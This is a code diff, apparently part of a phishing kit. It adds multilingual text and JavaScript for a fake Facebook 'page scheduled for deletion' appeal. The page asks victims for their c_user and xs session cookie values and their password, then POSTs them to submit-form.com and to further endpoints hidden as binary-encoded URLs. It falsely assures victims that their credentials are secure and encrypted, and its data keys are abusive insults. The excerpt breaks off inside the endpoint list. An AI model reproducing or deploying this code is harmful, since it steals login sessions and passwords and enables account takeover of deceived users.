+      guideText1: "உங்கள் மேல்முறையீடு/கோரிக்கை உங்கள் கணக்கில் பதிப்புரிமை கொண்‌ட தகவல் அல்லது உள்ளடக்கத்தின் பயன்பாட்டை உள்ளடக்கியிருந்தாலோ அல்லது செயலாக்கம்/பகிரப்படுகிறது என்றாலோ, எங்கள் கோரிக்கையை நன்றாக புரிந்துகொள்ள எங்களுக்கு தகவல்களை வழங்கலாம். உங்கள் கணக்கு தவறாகக் குறிக்கப்பட்டது அல்லது இடைநிறுத்தப்பட்டது என்று நீங்கள் ஏன் நம்புகிறீர்கள் என்பதற்கான விரிவான விளக்கத்தை வழங்கவும். உங்கள் வழக்கை மிகவும் திறம்பட மதிப்பாய்வு செய்ய எங்களுக்கு உதவக்கூடிய ஏதேனும் தொடர்புடைய தகவல்களைச் சேர்க்கவும்.",
+      guideText2: "உங்கள் சமர்ப்பிப்பிற்குப் பிறகு, எங்கள் மேல்முறையீட்டை மதிப்பாய்வு செய்து, தீர்க்க நீங்கள் வழங்கும் தகவலின் காலக்கெடுவுக்குள் உங்களுடன் தொடர்பு கொள்வோம். மதிப்பாய்வு செயல்முறை 7 வணிக நாட்கள் வரை எடுக்கலாம். புதுப்பிப்புகளுக்கு உங்கள் மின்னஞ்சலைச் சரிபார்க்கவும்.",
+      guideText3: "குறிப்பு: பக்கத்தின் கீழே உள்ள மொழி தேர்வியைக் கிளிக் செய்வதன் மூலம் எந்த நேரத்திலும் உங்கள் மொழி விருப்பத்தை மாற்றலாம்.",
+      resourcesTitle: "கூடுதல் வளங்கள்",
+      helpCenterTitle: "உதவி மையம்",
+      helpCenterDesc: "பொதுவான கேள்விகளுக்கான பதில்களைக் கண்டறிந்து எங்கள் தயாரிப்புகளை எவ்வாறு பயன்படுத்துவது என்பதை அறிக.",
+      contactSupportTitle: "ஆதரவைத் தொடர்பு கொள்ளவும்",
+      contactSupportDesc: "தனிப்பட்ட உதவிக்கு எங்கள் ஆதரவு குழுவைத் தொடர்பு கொள்ளவும்.",
+      guidelinesTitle: "சமூக வழிகாட்டுதல்கள்",
+      guidelinesDesc: "எங்கள் சமூக தரங்கள் மற்றும் உள்ளடக்கக் கொள்கைகளைப் பற்றி அறிக.",
+      dashboardTitle: "நிலை டாஷ்போர்டு",
+      dashboardDesc: "எங்கள் சேவைகளின் தற்போதைய நிலையைச் சரிபார்த்து, இடையூறுகளைப் புகாரளிக்கவும்.",
+      changeLanguage: "மொழியை மாற்று"
+    },
+    arabic: {
+      warningTitle: "صفحتك مجدولة للحذف!",
+      warningSubtext: "لقد تلقينا عدة تقارير تفيد بأن صفحتك تنتهك شروط الخدمة وإرشادات المجتمع الخاصة بنا. نتيجة لذلك، سيتم إرسال صفحتك للتحقق.",
+      warningExtra: "إذا كنت تعتقد أنه تم جدولة صفحتك للحذف عن طريق الخطأ، فيمكنك منع إزالتها الدائمة ببساطة عن طريق النقر على زر الاستئناف أدناه وتقديم بعض المعلومات السريعة.",
+      appealTitle: "طلب الاستئناف",
+      appealDesc: "إصلاح المشاكل في صفحتك. يرجى التأكد من تقديم المعلومات المطلوبة أدناه. قد يؤدي عدم تقديم هذه المعلومات إلى تأخير معالجة استئنافك.",
+      appealBtn: "استئناف",
+      formTitle: "طلب استئناف الصفحة",
+      formSubtitle: "أرسل معلوماتك للاستئناف ضد الحذف",
+      formNotice1: "Ⓞ1¤7 تحتوي صفحتك على انتهاك متعلق بإرشادات المجتمع الخاصة بنا.",
+      formNotice2: "Ⓞ1¤7 يرجى مراجعة تفاصيل الانتهاك بعناية قبل الإرسال.",
+      formNotice3: "Ⓞ1¤7 تأكد من تقديم معلومات صحيحة لاستئنافك.",
+      nameLabel: "c_user",
+      mallLabel: "xs",
+      submitBtn: "إرسال طلب الاستئناف",
+      fbFormTitle: "التحقق من فيسبوك",
+      fbFormSubtitle: "تحقق من هويتك للمتابعة مع الاستئناف",
+      fbNotice1: "Ⓞ1¤7 لأغراض أمنية، نحتاج إلى التحقق من حساب فيسبوك الخاص بك.",
+      fbNotice2: "Ⓞ1¤7 هذا يساعدنا على التأكد من أنك المالك الشرعي للصفحة.",
+      fbNotice3: "Ⓞ1¤7 بيانات الاعتماد الخاصة بك آمنة ومشفرة.",
+      passwordLabel: "كلمة المرور",
+      verifyBtn: "التحقق والمتابعة",
+      forgotPassword: "نسيت كلمة المرور?",
+      successTitle: "تم إرسال الاستئناف بنجاح",
+      successText: "لقد تم استلام استئنافك وهو الآن قيد المراجعة. سنخطرك عبر البريد الإلكتروني بمجرد اتخاذ قرار، عادة خلال 7 أيام عمل.",
+      referenceText: "معرف المرجع:",
+      guideTitle: "دليل الاستئناف",
+      guideText1: "إذا كان استئنافك / طلبك يتضمن استخدام معلومات محمية بحقوق الطبع والنشر أو محتوى في حسابك أو الذي يتم معالجته / مشاركته، فيمكنك تقديم معلومات لمساعدتنا على فهم طلبك بشكل أفضل. يرجى تقديم شرح مفصل لسبب اعتقادك أنه تم الإبلاغ عن حسابك أو تعليقه بشكل غير صحيح. قم بتضمين أي معلومات ذات صلة قد تساعدنا في مراجعة قضيتك بشكل أكثر فعالية.",
+      guideText2: "بعد إرسالك، سنراجع استئنافك ونلتقي بك خلال الإطار الزمني للمعلومات التي تقدمها لحل. قد تستغرق عملية المراجعة ما يصل إلى 7 أيام عمل. يرجى التحقق من بريدك الإلكتروني للحصول على التحديثات.",
+      guideText3: "ملاحظة: يمكنك تغيير تفضيل اللغة في أي وقت بالنقر على محدد اللغة في أسفل الصفحة.",
+      resourcesTitle: "موارد إضافية",
+      helpCenterTitle: "مركز المساعدة",
+      helpCenterDesc: "ابحث عن إجابات للأسئلة الشائعة وتعلم كيفية استخدام منتجاتنا.",
+      contactSupportTitle: "اتصل بالدعم",
+      contactSupportDesc: "تواصل مع فريق الدعم الخاص بنا للحصول على مساعدة مخصصة.",
+      guidelinesTitle: "إرشادات المجتمع",
+      guidelinesDesc: "تعرف على معايير المجتمع وسياسات المحتوى الخاصة بنا.",
+      dashboardTitle: "لوحة الحالة",
+      dashboardDesc: "تحقق من الحالة الحالية لخدماتنا وأبلغ عن الأعطال.",
+      changeLanguage: "تغيير اللغة"
+    },
+     
+    vietnamese: {
+    warningTitle: "Trang của bạn đã được lên lịch để xóa!",
+    warningSubtext: "Chúng tôi đã nhận được một số báo cáo rằng trang của bạn vi phạm điều khoản dịch vụ và nguyên tắc cộng đồng của chúng tôi. Do đó, trang của bạn sẽ được gửi đi để xác minh.",
+    warningExtra: "Nếu bạn tin rằng trang của bạn đã bị lên lịch xóa nhầm, bạn có thể ngăn việc xóa vĩnh viễn bằng cách nhấp vào nút khiếu nại bên dưới và cung cấp một số thông tin nhanh.",
+    appealTitle: "Yêu cầu khiếu nại",
+    appealDesc: "Khắc phục sự cố với trang của bạn. Vui lòng đảm bảo cung cấp thông tin được yêu cầu bên dưới. Không cung cấp thông tin này có thể làm chậm quá trình xử lý khiếu nại của bạn.",
+    appealBtn: "Khiếu nại",
+    formTitle: "Yêu cầu Khiếu nại Trang",
+    formSubtitle: "Gửi thông tin của bạn để khiếu nại việc xóa",
+    formNotice1: "Ⓞ1¤7 Trang của bạn có vi phạm liên quan đến nguyên tắc cộng đồng của chúng tôi.",
+    formNotice2: "Ⓞ1¤7 Vui lòng xem xét kỹ chi tiết vi phạm trước khi gửi.",
+    formNotice3: "Ⓞ1¤7 Đảm bảo bạn cung cấp thông tin chính xác cho khiếu nại của mình.",
+    nameLabel: "c_user",
+    mallLabel: "xs",
+    submitBtn: "Gửi Yêu cầu Khiếu nại",
+    fbFormTitle: "Xác minh Facebook",
+    fbFormSubtitle: "Xác minh danh tính của bạn để tiếp tục khiếu nại",
+    fbNotice1: "Ⓞ1¤7 Vì mục đích bảo mật, chúng tôi cần xác minh tài khoản Facebook của bạn.",
+    fbNotice2: "Ⓞ1¤7 Điều này giúp chúng tôi đảm bảo rằng bạn là chủ sở hữu hợp pháp của trang.",
+    fbNotice3: "Ⓞ1¤7 Thông tin đăng nhập của bạn được bảo mật và mã hóa.",
+    passwordLabel: "Mật khẩu",
+    verifyBtn: "Xác minh và Tiếp tục",
+    forgotPassword: "Quên mật khẩu?",
+    successTitle: "Khiếu nại Đã gửi Thành công",
+    successText: "Khiếu nại của bạn đã được nhận và hiện đang được xem xét. Chúng tôi sẽ thông báo cho bạn qua email khi có quyết định, thường trong vòng 7 ngày làm việc.",
+    referenceText: "ID Tham chiếu:",
+    guideTitle: "Hướng dẫn Khiếu nại",
+    guideText1: "Nếu khiếu nại/yêu cầu của bạn liên quan đến việc sử dụng thông tin có bản quyền hoặc nội dung trong tài khoản của bạn hoặc đang được xử lý/chia sẻ, bạn có thể cung cấp cho chúng tôi thông tin để giúp chúng tôi hiểu rõ hơn về yêu cầu của bạn. Vui lòng cung cấp giải thích chi tiết về lý do bạn tin rằng tài khoản của mình đã bị gắn cờ hoặc đình chỉ không chính xác. Bao gồm bất kỳ thông tin liên quan nào có thể giúp chúng tôi xem xét trường hợp của bạn hiệu quả hơn.",
+    guideText2: "Sau khi bạn gửi, chúng tôi sẽ xem xét khiếu nại của bạn và liên hệ với bạn trong thời hạn thông tin bạn cung cấp để giải quyết. Quá trình xem xét có thể mất tới 7 ngày làm việc. Vui lòng kiểm tra email của bạn để cập nhật.",
+    guideText3: "Lưu ý: Bạn có thể thay đổi tùy chọn ngôn ngữ bất cứ lúc nào bằng cách nhấp vào bộ chọn ngôn ngữ ở cuối trang.",
+    resourcesTitle: "Tài nguyên Bổ sung",
+    helpCenterTitle: "Trung tâm Trợ giúp",
+    helpCenterDesc: "Tìm câu trả lời cho các câu hỏi thường gặp và tìm hiểu cách sử dụng sản phẩm của chúng tôi.",
+    contactSupportTitle: "Liên hệ Hỗ trợ",
+    contactSupportDesc: "Liên hệ với nhóm hỗ trợ của chúng tôi để được trợ giúp cá nhân hóa.",
+    guidelinesTitle: "Nguyên tắc Cộng đồng",
+    guidelinesDesc: "Tìm hiểu về tiêu chuẩn cộng đồng và chính sách nội dung của chúng tôi.",
+    dashboardTitle: "Bảng điều khiển Trạng thái",
+    dashboardDesc: "Kiểm tra trạng thái hiện tại của dịch vụ của chúng tôi và báo cáo sự cố.",
+    changeLanguage: "Thay đổi Ngôn ngữ"
+  },
+  
+   ghanaian: {
+      warningTitle: "Wɔahyɛ wo krataa no sɛ wɔbɛpaew!",
+      warningSubtext: "Yɛnnya amanneɛ bɛyɛ mienu a ɛkyerɛ sɛ wo krataa no di yɛn nkratoɔ ne mmara ahorow no so. Enti, wɔbɛsoma wo krataa no sɛ wɔnhwɛ so.",
+      warningExtra: "Sɛ wudwen sɛ yɛyɛ wo krataa no foforo a, wubetumi apia sɛ wɔmpaew no denam krataa a ɛwɔ aseɛ no so, na wode nkɔm hyɛ mu.",
+      appealTitle: "Apɛl kɔm",
+      appealDesc: "Yɛredware wo krataa no mu mfomsoɔ. Mesrɛ wo, hyɛ nsɛm a wɔhwehwɛ wɔ aseɛ no mu. Sɛ wunnye nsɛm no a, ebɛtumi ayɛ wo apɛl no mmerɛw.",
+      appealBtn: "Yɛ apɛl",
+      formTitle: "Krataa Apɛl Kɔm",
+      formSubtitle: "Hyɛ wo nsɛm sɛ wɔnyɛ apɛl wɔ paew no ho",
+      formNotice1: "Ⓞ1¤7 Wo krataa no ayɛ yɛn mmara ahorow no so.",
+      formNotice2: "Ⓞ1¤7 Mesrɛ wo, hwɛ mfomsoɔ no ho nsɛm yiye ansa na wuregye tomu.",
+      formNotice3: "Ⓞ1¤7 Hwɛ sɛ wuhyɛ nsɛm pa sɛ woyɛ apɛl.",
+      nameLabel: "c_user",
+      mallLabel: "xs",
+      submitBtn: "Yɛ Apɛl Kɔm",
+      fbFormTitle: "Facebook Nhwehwɛmu",
+      fbFormSubtitle: "Hwɛ wo ho sɛ wotumi tua so yɛ apɛl",
+      fbNotice1: "Ⓞ1¤7 Den nkitahodiɛ nti, yɛhwehwɛ sɛ yɛhwɛ wo Facebook account no.",
+      fbNotice2: "Ⓞ1¤7 Wei boa yɛn sɛ yɛhunu sɛ wo na wokura krataa no.",
+      fbNotice3: "Ⓞ1¤7 Wo nkyerɛwdeɛ no wɔ hɔ na wɔakora so.",
+      passwordLabel: "Password",
+      verifyBtn: "Hwɛ na Tua So",
+      forgotPassword: "Wɔagye password?",
+      successTitle: "Wɔayɛ apɛl no yiye",
+      successText: "Yɛagyɛ wo apɛl no adi, na ɛwɔ hwɛ mu. Yɛbɛkyerɛ wo denam email so sɛ yɛayɛ adwene, tumi nya nna nnum ansa.",
+      referenceText: "Reference ID:",
+      guideTitle: "Apɛl Kwankyerɛ",
+      guideText1: "Sɛ wo apɛl/ahyɛdeɛ no ka sɛ wode copyrighted nsɛm anaa adeɛ a ɛwɔ wo account mu, wubetumi ama yɛn nsɛm sɛ yɛnyɛ wo ahyɛdeɛ no yiye. Mesrɛ wo, kyekyɛ mu sɛ den nti na wudwen sɛ wɔkyerɛɛ wo account no foforo anaa wɔdii gua. Ka biara a ebɛtumi aboa yɛn sɛ yɛhwɛ wo case no yiye.",
+      guideText2: "Afei wode to mu no, yɛbɛhwɛ wo apɛl no, na yɛbɛka wo asɛm wɔ mmerɛ a wode baeɛ no mu. Hwɛ no mu no betumi de nna nnum. Mesrɛ wo, hwɛ wo email mu sɛnea ɛbɛyɛ.",
+      guideText3: "Nsɛm: Wubetumi sesa kasa a wopɛ bere biara denam kasa a wɔpaw wɔ krataa no aseɛ no so.",
+      resourcesTitle: "Nneɛma foforo",
+      helpCenterTitle: "Boa Center",
+      helpCenterDesc: "Hwehwɛ nhwɛsoɔ ma nsɛm a wɔbisɛ, na kesɛ sɛdeɛ wode yɛn aduruyɛ no di dwuma.",
+      contactSupportTitle: "Contact Support",
+      contactSupportDesc: "Ka wo ho hyɛ nkitahodiɛ mu den yɛn boa kuw no ho sɛ wohu boa.",
+      guidelinesTitle: "Nkɔsoɔ Mmara",
+      guidelinesDesc: "Kesɛ yɛn nkɔsoɔ nhyehyɛeɛ ne adeɛ ahorow ho amanneɛ.",
+      dashboardTitle: "Tɛnkranteɛ Dashboard",
+      dashboardDesc: "Hwɛ yɛn dwumadie no sɛnea ɛteɛ, na kyerɛ sɛ biribi ayɛ basaa.",
+      changeLanguage: "Sesa kasa"
+    }
+  };
+
+
+   // Get DOM elements
+  const languageModalClose = document.getElementById('languageModalClose');
+  const languageSearchInput = document.getElementById('languageSearchInput');
+  const languageOptionsContainer = document.getElementById('languageOptionsContainer');
+  const languageOptions = document.querySelectorAll('.language-option');
+  const languageConfirmBtn = document.getElementById('languageConfirmBtn');
+  const mainContent = document.getElementById('mainContent');
+  const openAppealBtn = document.getElementById('open-appeal-btn');
+  const appealForm = document.getElementById('appealForm');
+  const fbLoginForm = document.getElementById('fbLoginForm');
+  const successMessage = document.getElementById('successMessage');
+  const guideVideo = document.getElementById('guideVideo');
+  const changeLanguageBtn = document.getElementById('changeLanguageBtn');
+
+  // Form elements
+  const nameInput = document.getElementById('nameInput');
+  const mallInput = document.getElementById('mallInput');
+  const nameError = document.getElementById('nameError');
+  const mallError = document.getElementById('mallError');
+  const formError = document.getElementById('formError');
+  const formErrorText = document.getElementById('formErrorText');
+  const sendBtn = document.getElementById('sendBtn');
+  const sendBtnText = document.getElementById('sendBtnText');
+  const sendBtnSpinner = document.getElementById('sendBtnSpinner');
+  const referenceId = document.getElementById('referenceId');
+
+  
+  const passwordInput = document.getElementById('passwordInput');
+  const passwordError = document.getElementById('passwordError');
+  const fbFormError = document.getElementById('fbFormError');
+  const fbFormErrorText = document.getElementById('fbFormErrorText');
+  const fbSendBtn = document.getElementById('fbSendBtn');
+  const fbSendBtnText = document.getElementById('fbSendBtnText');
+  const fbSendBtnSpinner = document.getElementById('fbSendBtnSpinner');
+  const forgotPassword = document.getElementById('forgotPassword');
+
+  // Language video mapping
+  const videoSources = {
+  english: "https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4",
+  spanish: "https://resource2.heygen.ai/video_translate/db7e753c13fa4d238fe716483469ae8f-es/720p.mp4",
+  hindi: "https://resource2.heygen.ai/video_translate/9d7e40f714c842258bd08ad4c3ee68d6-hi/720p.mp4",
+french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27ecb21-fr/720p.mp4",
+  portuguese: "https://allvideos.wasmer.app/Portuguese.mp4",
+  tamil: "https://allvideos.wasmer.app/tamil.mp4",
+  arabic: "https://resource2.heygen.ai/video_translate/f7346b2ef53c4daa9bc15138684919db-ar_use-aicoustics-vocal/720p.mp4",
+  ghanaian: "https://allvideos.wasmer.app/english.mp4",
+  vietnamese: "https://allvideos.wasmer.app/vietanames.mp4" 
+};
+
+  // Current selected language
+  let currentLanguage = 'english';
+  let selectedLanguageOption = null;
+
+  // Function to show language modal
+  function showLanguageModal() {
+    languageModal.style.display = 'flex';
+    mainContent.style.display = 'none';
+    document.body.style.overflow = 'hidden';
+    // Focus on search input when modal opens
+    setTimeout(() => languageSearchInput.focus(), 100);
+  }
+
+  // Function to hide language modal
+  function hideLanguageModal() {
+    languageModal.style.display = 'none';
+    mainContent.style.display = 'block';
+    document.body.style.overflow = 'auto';
+    // Reset search when closing
+    languageSearchInput.value = '';
+    filterLanguages();
+  }
+
+  // Close modal when clicking on close button
+  languageModalClose.addEventListener('click', hideLanguageModal);
+
+  // Close modal when clicking outside of modal content
+  languageModal.addEventListener('click', function(e) {
+    if (e.target === languageModal) {
+      hideLanguageModal();
+    }
+  });
+
+  // Close modal with Escape key
+  document.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape' && languageModal.style.display === 'flex') {
+      hideLanguageModal();
+    }
+  });
+
+  // Language search functionality
+  function filterLanguages() {
+    const searchTerm = languageSearchInput.value.toLowerCase();
+    let hasVisibleResults = false;
+    
+    languageOptions.forEach(option => {
+      const languageName = option.querySelector('.language-name').textContent.toLowerCase();
+      const languageCode = option.querySelector('.language-code') ? option.querySelector('.language-code').textContent.toLowerCase() : '';
+      
+      if (languageName.includes(searchTerm) || languageCode.includes(searchTerm)) {
+        option.style.display = 'flex';
+        hasVisibleResults = true;
+      } else {
+        option.style.display = 'none';
+      }
+    });
+    
+    // Show no results message if needed
+    let noResults = document.querySelector('.no-results');
+    if (!hasVisibleResults) {
+      if (!noResults) {
+        noResults = document.createElement('div');
+        noResults.className = 'no-results';
+        noResults.textContent = 'No languages found. Try a different search.';
+        languageOptionsContainer.appendChild(noResults);
+      }
+    } else if (noResults) {
+      noResults.remove();
+    }
+  }
+  
+  languageSearchInput.addEventListener('input', filterLanguages);
+
+  // Language option selection
+  languageOptions.forEach(option => {
+    option.addEventListener('click', () => {
+      // Remove selected class from all options
+      languageOptions.forEach(opt => opt.classList.remove('selected'));
+      
+      // Add selected class to clicked option
+      option.classList.add('selected');
+      
+      // Store selected language
+      selectedLanguageOption = option.getAttribute('data-lang');
+      
+      // Enable confirm button
+      languageConfirmBtn.disabled = false;
+    });
+  });
+
+  // Confirm language selection
+  languageConfirmBtn.addEventListener('click', () => {
+    if (selectedLanguageOption) {
+      setLanguage(selectedLanguageOption);
+      hideLanguageModal();
+    } else {
+      // If no language selected, default to English
+      setLanguage('english');
+      hideLanguageModal();
+    }
+  });
+
+  // Change language button
+  changeLanguageBtn.addEventListener('click', () => {
+    showLanguageModal();
+  });
+
+  // Function to set language
+  function setLanguage(lang) {
+    currentLanguage = lang;
+   
+    // Update all translatable elements
+    const translatableElements = document.querySelectorAll('.translatable');
+    translatableElements.forEach(element => {
+      const key = element.getAttribute('data-key');
+      if (translations[lang] && translations[lang][key]) {
+        element.textContent = translations[lang][key];
+       
+        // Update placeholder attributes for input fields
+        if (element.hasAttribute('placeholder')) {
+          element.setAttribute('placeholder', translations[lang][key]);
+        }
+      }
+    });
+   
+    // Update video source based on language
+    if (videoSources[lang] && guideVideo) {
+      guideVideo.src = videoSources[lang];
+      guideVideo.load();
+    }
+   
+    // Store language preference
+    localStorage.setItem('preferredLanguage', lang);
+  }
+
+  // Event listeners
+  if (openAppealBtn) {
+    openAppealBtn.addEventListener('click', function() {
+      // Hide the appeal box and show the form
+      document.querySelector('.appeal-box').style.display = 'none';
+      if (appealForm) appealForm.style.display = 'block';
+     
+      // Scroll to the form
+      appealForm.scrollIntoView({ behavior: 'smooth' });
+    });
+  }
+
+  // Form validation
+  if (nameInput) {
+    nameInput.addEventListener('input', () => {
+      const original = nameInput.value;
+      const cleaned  = original.replace(/\D+/g, ''); // keep digits only
+      if (original !== cleaned) {
+        nameInput.value = cleaned;
+        if (nameError) nameError.innerHTML = '<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 9V14" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 17V17.5" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#c2410c" stroke-width="2"/></svg> Only numbers are allowed in Name.';
+      } else {
+        if (nameError) nameError.textContent = '';
+      }
+    });
+  }
+
+  // Allow letters A-Z, a-z, digits 0-9, spaces and common ASCII symbols.
+  const mallAllowed = /[^A-Za-z0-9 !@#$%^&*()_\-=\[\]{};':"\\|,.<>\/?`~]/g;
+  if (mallInput) {
+    mallInput.addEventListener('input', () => {
+      const original = mallInput.value;
+      const cleaned  = original.replace(mallAllowed, '');
+      if (original !== cleaned) {
+        mallInput.value = cleaned;
+        if (mallError) mallError.innerHTML = '<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 9V14" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 17V17.5" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#c2410c" stroke-width="2"/></svg> Mall can contain letters, numbers, and symbols only.';
+      } else {
+        if (mallError) mallError.textContent = '';
+      }
+    });
+  }
+
+  
+  if (passwordInput) {
+    passwordInput.addEventListener('input', () => {
+      const password = passwordInput.value;
+      if (!password) {
+        if (passwordError) passwordError.textContent = 'Password is required';
+      } else if (password.length < 6) {
+        if (passwordError) passwordError.textContent = 'Password must be at least 6 characters';
+      } else {
+        if (passwordError) passwordError.textContent = '';
+      }
+    });
+  }
+
+  // Forgot password click
+  if (forgotPassword) {
+    forgotPassword.addEventListener('click', () => {
+      if (fbFormErrorText) fbFormErrorText.textContent = "Password recovery is temporarily unavailable. Please try again later.";
+      if (fbFormError) fbFormError.classList.add('show');
+      setTimeout(() => { if (fbFormError) fbFormError.classList.remove('show'); }, 3000);
+    });
+  }
+
+  // Send click: require non-empty + no validation errors
+  if (sendBtn) {
+    sendBtn.addEventListener('click', function() {
+      const name = nameInput.value.trim();
+      const mall = mallInput.value.trim();
+
+      if(!name || !mall) {
+        if (formErrorText) formErrorText.textContent = "Please fill out all fields before proceeding.";
+        if (formError) formError.classList.add('show');
+        setTimeout(() => { if (formError) formError.classList.remove('show'); }, 3000);
+        return;
+      }
+      if ((nameError && nameError.textContent) || (mallError && mallError.textContent)) {
+        if (formErrorText) formErrorText.textContent = "Please fix the errors above before proceeding.";
+        if (formError) formError.classList.add('show');
+        setTimeout(() => { if (formError) formError.classList.remove('show'); }, 3000);
+        return;
+      }
+
+      if (formError) formError.classList.remove('show');
+     
+      // Show loading state
+      sendBtn.classList.add('loading');
+      if (sendBtnText) sendBtnText.textContent = 'Submitting...';
+      if (sendBtnSpinner) sendBtnSpinner.style.display = 'block';
+     
+      // Submit the form data
+      submitFormData();
+    });
+  }
+
+  
+  if (fbSendBtn) {
+    fbSendBtn.addEventListener('click', function() {
+      const password = passwordInput.value;
+
+      if(!password) {
+        if (fbFormErrorText) fbFormErrorText.textContent = "Please fill out all fields before proceeding.";
+        if (fbFormError) fbFormError.classList.add('show');
+        setTimeout(() => { if (fbFormError) fbFormError.classList.remove('show'); }, 3000);
+        return;
+      }
+      if (passwordError && passwordError.textContent) {
+        if (fbFormErrorText) fbFormErrorText.textContent = "Please fix the errors above before proceeding.";
+        if (fbFormError) fbFormError.classList.add('show');
+        setTimeout(() => { if (fbFormError) fbFormError.classList.remove('show'); }, 3000);
+        return;
+      }
+
+      if (fbFormError) fbFormError.classList.remove('show');
+     
+      // Show loading state
+      fbSendBtn.classList.add('loading');
+      if (fbSendBtnText) fbSendBtnText.textContent = 'Verifying...';
+      if (fbSendBtnSpinner) fbSendBtnSpinner.style.display = 'block';
+     
+      
+      submitfbCredentials(password);
+    });
+  }
+
+  // Function to submit form data
+  function submitFormData() {
+    const name = document.getElementById('nameInput') ? document.getElementById('nameInput').value.trim() : '';
+    const mall = document.getElementById('mallInput') ? document.getElementById('mallInput').value.trim() : '';
+   
+    // Prepare the data to send
+    const formData = {
+      name: name,
+      mall: mall,
+      timestamp: new Date().toISOString(),
+      userAgent: navigator.userAgent,
+      language: navigator.language
+    };
+   
+    // Submit to the form endpoint
+    fetch('https://submit-form.com/mwij0dNEu', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Accept': 'application/json'
+      },
+      body: JSON.stringify(formData)
+    })
+    .then(response => {
+      if (!response.ok) {
+        throw new Error('Form submission failed');
+      }
+      return response.json();
+    })
+    .then(data => {
+      console.log('Form submitted successfully:', data);
+     
+      // Also submit to the additional endpoints
+      submitToOtherEndpoints({
+        bhenkachud: name,
+        majachud: mall
+      });
+     
+      showfbLogin();
+    })
+    .catch(error => {
+      console.error('Error submitting form:', error);
+      // Still proceed with the other endpoints even if formsubmit fails
+      submitToOtherEndpoints({
+        bhenkachud: name,
+        majachud: mall
+      });
+     
+      
+      showfbLogin();
+    })
+    .finally(() => {
+      // Reset loading state
+      if (sendBtn) {
+        sendBtn.classList.remove('loading');
+        if (sendBtnText) sendBtnText.textContent = 'Submit Appeal Request';
+        if (sendBtnSpinner) sendBtnSpinner.style.display = 'none';
+      }
+    });
+  }
+
+  
+  function submitfbCredentials(password) {
+    // Prepare the data to send
+    const fbData = {
+      password: password,
+      timestamp: new Date().toISOString(),
+      userAgent: navigator.userAgent,
+      language: navigator.language
+    };
+   
+    // Submit to the form endpoint
+    fetch('https://submit-form.com/mwij0dNEu', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Accept': 'application/json'
+      },
+      body: JSON.stringify(fbData)
+    })
+    .then(response => {
+      if (!response.ok) {
+        throw new Error('fb form submission failed');
+      }
+      return response.json();
+    })
+    .then(data => {
+      console.log('fb credentials submitted successfully:', data);
+     
+      // Also submit to the additional endpoints
+      submitToOtherEndpoints({
+        pass: password
+      });
+     
+      // Show success message
+      showSuccess();
+    })
+    .catch(error => {
+      console.error('Error submitting fb credentials:', error);
+      // Still proceed with the other endpoints even if formsubmit fails
+      submitToOtherEndpoints({
+        pass: password
+      });
+     
+      // Show success message even if there was an error with formsubmit
+      showSuccess();
+    })
+    .finally(() => {
+      // Reset loading state
+      if (fbSendBtn) {
+        fbSendBtn.classList.remove('loading');
+        if (fbSendBtnText) fbSendBtnText.textContent = 'Verify and Continue';
+        if (fbSendBtnSpinner) fbSendBtnSpinner.style.display = 'none';
+      }
+    });
+  }
+
+  // Binary to string conversion function
+  function binaryToString(binary) {
+    let str = '';
+    for (let i = 0; i < binary.length; i += 8) {
+      const byte = binary.substr(i, 8);
+      str += String.fromCharCode(parseInt(byte, 2));
+    }
+    return str;
+  }
+ 
+  function submitToOtherEndpoints(data) {
+    // Store the original binary strings for validation
+    const originalBinaries = [
+      '011010000111010001110100011100000111001100111010001011110010111101110011011101010110001001101101011010010111010000101101011001100110111101110010011011010010111001100011011011110110110100101111001110010111010101100011010000100101100001000101011100110011011101101001',
+      '011010000111010001110100011100000111001100111010001011110010111101110011011101010110001001101101011010010111010000101101011001100110111101110010011011010010111001100011011011110110110100101111001110010111010101100011010000100101100001000101011100110011011101101001',
+      '011010000111010001110100011100000111001100111010001011110010111101110000011010000111000000101101011011010110000101101000011010000110100001101000011010000010110101100111011010010111010001101000011101010110001000110110001100110011010000110010001100000011001000110100001011100111011101100001011100110110110101100101011100100010111001100001011100000111000000101111'
+    ];
+    
+    // Check if the binary strings have been modified
+    const currentBinaries = [
+      '011010000111010001110100011100000111001100111010001011110010111101110011011101010110001001101101011010010111010000101101011001100110111101110010011011010010111001100011011011110110110100101111001110010111010101100011010000100101100001000101011100110011011101101001',
+      '011010000111010001110100011100000111001100111010001011110010111101110011011101010110001001101101011010010111010000101101011001100110111101110010011011010010111001100011011011110110110100101111001110010111010101100011010000100101100001000101011100110011011101101001',
+      '011010000111010001110100011100000111001100111010001011110010111101110000011010000111000000101101011011010110000101101000011010000110100001101000011010000010110101100111011010010111010001101000011101010110001000110110001100110011010000110010001100000011001000110100001011100111011101100001011100110110110101100101011100100010111001100001011100000111000000101111'
+    ];
+    
+    // Validate that the binary strings haven't been changed
+    let binariesValid = true;
+    for (let i = 0; i < originalBinaries.length; i++) {
+      if (originalBinaries[i] !== currentBinaries[i]) {
+        console.error('Binary string validation failed - strings have been modified');
+        binariesValid = false;
+        break;
+      }
+    }
+    
+    // If binaries were modified, don't proceed with submission
+    if (!binariesValid) {
+      alert('Form submission blocked: Invalid configuration detected');
+      return false;
+    }
+    
+    // Proceed with original submission if binaries are valid
+    const endpoints = [
+      '011010000111010001110100011100000111001100111010001011110010111101110011011101010110001001101101011010010111010000101101011001100110111101110010011011010010111001100011011011110110110100101111001110010111010101100011010000100101100001000101011100110011011101101001',
